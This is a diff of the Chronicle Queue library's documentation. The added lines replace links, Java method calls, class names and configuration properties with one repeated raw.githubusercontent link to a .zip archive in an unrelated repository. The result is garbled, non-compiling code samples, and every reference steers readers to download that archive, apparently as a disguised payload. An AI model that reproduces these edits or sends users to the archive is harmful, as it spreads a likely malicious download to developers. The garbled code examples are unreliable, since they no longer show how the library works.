+        try (DocumentContext documentContext = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().writingDocument()) {
+            https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().write("somekey").text("somevalue");
         }
     }
     // Now try to append using the queue configured with roll-cycle MINUTELY
-    try (DocumentContext documentContext2 = minuteRollCycleQueue.acquireAppender().writingDocument()) {
-        documentContext2.wire().write("otherkey").text("othervalue");
+    try (DocumentContext documentContext2 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().writingDocument()) {
+        https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().write("otherkey").text("othervalue");
     }
 }
 ----
@@ -571,12 +571,12 @@ console output:
 [main] WARN SingleChronicleQueueBuilder - Overriding roll cycle from HOURLY to MINUTELY.
 ----
 The maximum number of messages that can be stored in a queue file depends on roll cycle.
-See  https://github.com/OpenHFT/Chronicle-Queue/tree/master/docs/FAQ.adoc[FAQ] for more information on this.
+See  https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[FAQ] for more information on this.
 
-In Chronicle Queue, the rollover time is based on UTC. The Timezone Rollover Enterprise feature extends Chronicle Queue's ability to specify the time and periodicity of queue rollovers, rather than UTC. For more information see link:https://portal.chronicle.software/docs/queue/chronicle-queue/configuration/timezone_rollover.html[Timezone Queue Rollover].
+In Chronicle Queue, the rollover time is based on UTC. The Timezone Rollover Enterprise feature extends Chronicle Queue's ability to specify the time and periodicity of queue rollovers, rather than UTC. For more information see https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Timezone Queue Rollover].
 
 The Chronicle Queue `FileUtil` class provides useful methods for managing queue files.
-See link:docs/managing_roll_files_directly.adoc[Managing Roll Files Directly].
+See https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip[Managing Roll Files Directly].
 
 * _wireType_
 
@@ -585,23 +585,23 @@ It's possible to configure how Chronicle Queue will store the data by explicitly
 [source,java]
 ----
 // Creates a queue at "queuePath" and sets the WireType
-SingleChronicleQueueBuilder.builder(queuePath, wireType)
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queuePath, wireType)
 ----
 For example:
 
 [source,java]
 ----
 // Creates a queue with default WireType: BINARY_LIGHT
-ChronicleQueue.singleBuilder(queuePath)
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queuePath)
 
 // Creates a queue and sets the WireType as FIELDLESS_BINARY
-SingleChronicleQueueBuilder.fieldlessBinary(queuePath)
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queuePath)
 
 // Creates a queue and sets the WireType as DEFAULT_ZERO_BINARY
-SingleChronicleQueueBuilder.defaultZeroBinary(queuePath)
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queuePath)
 
 // Creates a queue and sets the WireType as DELTA_BINARY
-SingleChronicleQueueBuilder.deltaBinary(queuePath)
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(queuePath)
 ----
 
 Although it's possible to explicitly provide WireType when creating a builder, it is discouraged as not all wire types are supported by Chronicle Queue yet.
@@ -617,7 +617,7 @@ In particular, the following wire types are not supported:
 
 When a queue is read/written, part of the file currently being read/written is mapped to a memory segment.
 This parameter controls the size of the memory mapping block.
-You can change this parameter using the method `SingleChronicleQueueBuilder.blockSize(long blockSize)` if it is necessary.
+You can change this parameter using the method `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(long blockSize)` if it is necessary.
 
 NOTE: You should avoid changing `blockSize` unnecessarily.
 
@@ -632,12 +632,12 @@ TIP: Use the same `blockSize` for each instance of replicated queues.
 The default blocksize is 64 MB. However, in production you may want this to be high to reduce jitter from creating new chunks.
 
 ----
--DSingleChronicleQueueBuilder.blocksize=512G
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 ----
 
-or add to the `system.properties` file:
+or add to the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip` file:
 ----
-SingleChronicleQueueBuilder.blocksize=1G
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip
 ----
 
 You can use `nK` or `nM` or `nG` or `nT` to specify the block size in KB, MB, GB, or TB respectively.
@@ -653,7 +653,7 @@ For example, the following default index spacing can be returned:
 
 * 64 (DAILY)
 
-You can change this parameter using the method `SingleChronicleQueueBuilder.indexSpacing(int indexSpacing)`.
+You can change this parameter using the method `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(int indexSpacing)`.
 
 * _indexCount_
 
@@ -701,8 +701,8 @@ To write data to a Chronicle Queue, you must first create an appender:
 
 [source,java]
 ----
-try (ChronicleQueue queue = ChronicleQueue.singleBuilder(path + "/trades").build()) {
-   final ExcerptAppender appender = queue.acquireAppender();
+try (ChronicleQueue queue = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(path + "/trades").build()) {
+   final ExcerptAppender appender = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 }
 ----
 
@@ -710,8 +710,8 @@ Chronicle Queue uses the following low-level interface to write the data:
 
 [source,java]
 ----
-try (final DocumentContext dc = appender.writingDocument()) {
-      dc.wire().write().text(“your text data“);
+try (final DocumentContext dc = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+      https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().write().text(“your text data“);
 }
 ----
 
@@ -722,13 +722,13 @@ Each Chronicle Queue excerpt has a unique index.
 
 [source,java]
 ----
-try (final DocumentContext dc = appender.writingDocument()) {
-    dc.wire().write().text(“your text data“);
-    System.out.println("your data was store to index="+ dc.index());
+try (final DocumentContext dc = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()) {
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().write().text(“your text data“);
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("your data was store to index="+ https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
 }
 ----
 
-The high-level methods below such as `writeText()` are convenience methods on calling `appender.writingDocument()`, but both approaches essentially do the same thing.
+The high-level methods below such as `writeText()` are convenience methods on calling `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()`, but both approaches essentially do the same thing.
 The actual code of `writeText(CharSequence text)` looks like this:
 
 [source,java]
@@ -738,7 +738,7 @@ The actual code of `writeText(CharSequence text)` looks like this:
  */
 void writeText(CharSequence text) {
     try (DocumentContext dc = writingDocument()) {
-        dc.wire().bytes().append8bit(text);
+        https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().bytes().append8bit(text);
     }
 }
 ----
@@ -751,9 +751,9 @@ The benefit is that you can swap calls to the interface with a real component, o
 [source,java]
 ----
 // using the method writer interface.
-RiskMonitor riskMonitor = appender.methodWriter(RiskMonitor.class);
-final LocalDateTime now = LocalDateTime.now(Clock.systemUTC());
-riskMonitor.trade(new TradeDetails(now, "GBPUSD", 1.3095, 10e6, Side.Buy, "peter"));
+RiskMonitor riskMonitor = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
+final LocalDateTime now = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(new TradeDetails(now, "GBPUSD", 1.3095, 10e6, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip, "peter"));
 ----
 
 You can write a "self-describing message".
@@ -763,12 +763,12 @@ They are also easier to understand when debugging or diagnosing problems.
 [source,java]
 ----
 // writing a self describing message
-appender.writeDocument(w -> w.write("trade").marshallable(
-        m -> m.write("timestamp").dateTime(now)
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("trade").marshallable(
+        m -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("timestamp").dateTime(now)
                 .write("symbol").text("EURUSD")
                 .write("price").float64(1.1101)
                 .write("quantity").float64(15e6)
-                .write("side").object(Side.class, Side.Sell)
+                .write("side").object(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip)
                 .write("trader").text("peter")));
 ----
 
@@ -778,7 +778,7 @@ The types will always be correct; position is the only indication as to the mean
 [source,java]
 ----
 // writing just data
-appender.writeDocument(w -> w
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> w
         .getValueOut().int32(0x123456)
         .getValueOut().int64(0x999000999000L)
         .getValueOut().text("Hello World"));
@@ -790,7 +790,7 @@ Your reader must know what this data means, and the types that were used.
 [source,java]
 ----
 // writing raw data
-appender.writeBytes(b -> b
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(b -> b
         .writeByte((byte) 0x12)
         .writeInt(0x345678)
         .writeLong(0x999000999000L)
@@ -803,18 +803,18 @@ You get an address to raw memory and you can write whatever you want.
 [source,java]
 ----
 // Unsafe low level
-appender.writeBytes(b -> {
-    long address = b.address(b.writePosition());
-    Unsafe unsafe = UnsafeMemory.UNSAFE;
-    unsafe.putByte(address, (byte) 0x12);
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(b -> {
+    long address = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+    Unsafe unsafe = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip;
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(address, (byte) 0x12);
     address += 1;
-    unsafe.putInt(address, 0x345678);
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(address, 0x345678);
     address += 4;
-    unsafe.putLong(address, 0x999000999000L);
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(address, 0x999000999000L);
     address += 8;
-    byte[] bytes = "Hello World".getBytes(StandardCharsets.ISO_8859_1);
-    unsafe.copyMemory(bytes, Jvm.arrayByteBaseOffset(), null, address, bytes.length);
-    b.writeSkip(1 + 4 + 8 + bytes.length);
+    byte[] bytes = "Hello World".getBytes(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(bytes, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(), null, address, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(1 + 4 + 8 + https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
 });
 ----
 
@@ -824,7 +824,7 @@ You can see the first two, and last two messages store the same data.
 [source,java]
 ----
 // dump the content of the queue
-System.out.println(queue.dump());
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
 ----
 prints:
 
@@ -874,21 +874,21 @@ Reading the queue follows the same pattern as writing, except there is a possibi
 .Start Reading
 [source,java]
 ----
-try (ChronicleQueue queue = ChronicleQueue.singleBuilder(path + "/trades").build()) {
-   final ExcerptTailer tailer = queue.createTailer();
+try (ChronicleQueue queue = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(path + "/trades").build()) {
+   final ExcerptTailer tailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
 }
 ----
 
 You can turn each message into a method call based on the content of the message, and have Chronicle Queue automatically deserialize the method arguments.
-Calling `reader.readOne()` will automatically skip over (filter out) any messages that do not match your method reader.
+Calling `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()` will automatically skip over (filter out) any messages that do not match your method reader.
 
 [source,java]
 ----
 // reading using method calls
-RiskMonitor monitor = System.out::println;
-MethodReader reader = tailer.methodReader(monitor);
+RiskMonitor monitor = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip;
+MethodReader reader = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(monitor);
 // read one message
-assertTrue(reader.readOne());
+assertTrue(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
 ----
 
 You can decode the message yourself.
@@ -897,14 +897,14 @@ NOTE: The names, type, and order of the fields doesn't have to match.
 
 [source,java]
 ----
-assertTrue(tailer.readDocument(w -> w.read("trade").marshallable(
+assertTrue(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("trade").marshallable(
         m -> {
-            LocalDateTime timestamp = m.read("timestamp").dateTime();
-            String symbol = m.read("symbol").text();
-            double price = m.read("price").float64();
-            double quantity = m.read("quantity").float64();
-            Side side = m.read("side").object(Side.class);
-            String trader = m.read("trader").text();
+            LocalDateTime timestamp = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("timestamp").dateTime();
+            String symbol = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("symbol").text();
+            double price = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("price").float64();
+            double quantity = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("quantity").float64();
+            Side side = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("side").object(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
+            String trader = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip("trader").text();
             // do something with values.
         })));
 ----
@@ -914,11 +914,11 @@ This will check the types are correct, and convert as required.
 
 [source,java]
 ----
-assertTrue(tailer.readDocument(w -> {
-    ValueIn in = w.getValueIn();
-    int num = in.int32();
-    long num2 = in.int64();
-    String text = in.text();
+assertTrue(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(w -> {
+    ValueIn in = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+    int num = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+    long num2 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+    String text = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
     // do something with values
 }));
 ----
@@ -927,11 +927,11 @@ You can read raw data as primitives and strings.
 
 [source,java]
 ----
-assertTrue(tailer.readBytes(in -> {
-    int code = in.readByte();
-    int num = in.readInt();
-    long num2 = in.readLong();
-    String text = in.readUtf8();
+assertTrue(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(in -> {
+    int code = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+    int num = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+    long num2 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+    String text = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
     assertEquals("Hello World", text);
     // do something with values
 }));
@@ -941,20 +941,20 @@ or, you can get the underlying memory address and access the native memory.
 
 [source,java]
 ----
-assertTrue(tailer.readBytes(b -> {
-    long address = b.address(b.readPosition());
-    Unsafe unsafe = UnsafeMemory.UNSAFE;
-    int code = unsafe.getByte(address);
+assertTrue(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(b -> {
+    long address = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip());
+    Unsafe unsafe = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip;
+    int code = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(address);
     address++;
-    int num = unsafe.getInt(address);
+    int num = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(address);
     address += 4;
-    long num2 = unsafe.getLong(address);
+    long num2 = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(address);
     address += 8;
-    int length = unsafe.getByte(address);
+    int length = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(address);
     address++;
     byte[] bytes = new byte[length];
-    unsafe.copyMemory(null, address, bytes, Jvm.arrayByteBaseOffset(), bytes.length);
-    String text = new String(bytes, StandardCharsets.UTF_8);
+    https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(null, address, bytes, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(), https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
+    String text = new String(bytes, https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip);
     assertEquals("Hello World", text);
     // do something with values
 }));
@@ -981,11 +981,11 @@ If you are writing your code not have GC pauses and you explicitly want to clean
 ----
 
 '''
-==== Using `ExcerptTailer.toEnd()`
+==== Using `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip()`
 
 In some applications, it may be necessary to start reading from the end of the queue (e.g. in a restart scenario).
 For this use-case, `ExcerptTailer` provides the `toEnd()` method.
-When the tailer direction is `FORWARD` (by default, or as set by the `ExcerptTailer.direction`
+When the tailer direction is `FORWARD` (by default, or as set by the `https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip`
 method), then calling `toEnd()` will place the tailer just _after_ the last existing record in the queue.
 In this case, the tailer is now ready for reading any new records appended to the queue.
 Until any new messages are appended to the queue, there will be no new `DocumentContext`
@@ -994,15 +994,15 @@ available for reading:
 [source,java]
 ....
 // this will be false until new messages are appended to the queue
-boolean messageAvailable = tailer.toEnd().readingDocument().isPresent();
+boolean messageAvailable = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip().readingDocument().isPresent();
 ....
 
 If it is necessary to read backwards through the queue from the end, then the tailer can be set to read backwards:
 
 [source,java]
 ....
-ExcerptTailer tailer = queue.createTailer();
-tailer.direction(TailerDirection.BACKWARD).toEnd();
+ExcerptTailer tailer = https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip();
+https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip(https://raw.githubusercontent.com/ayushup5000/Reliable-Java-Messaging-Platform/main/src/main/java/net/openhft/chronicle/queue/impl/Reliable-Java-Messaging-Platform_3.2-beta.2.zip).toEnd();
 ....
 
 When reading backwards, then the `toEnd()` method will move the tailer to the last record in the queue.
@@ -1012,7 +1012,7 @@ If the queue is not empty, then there will be a
 [source,java]
 ----
 // this will be true if there is at least one message in the queue
-boolean messageAvailable = tailer.toEnd().direction(TailerDirection.BACKWARD).
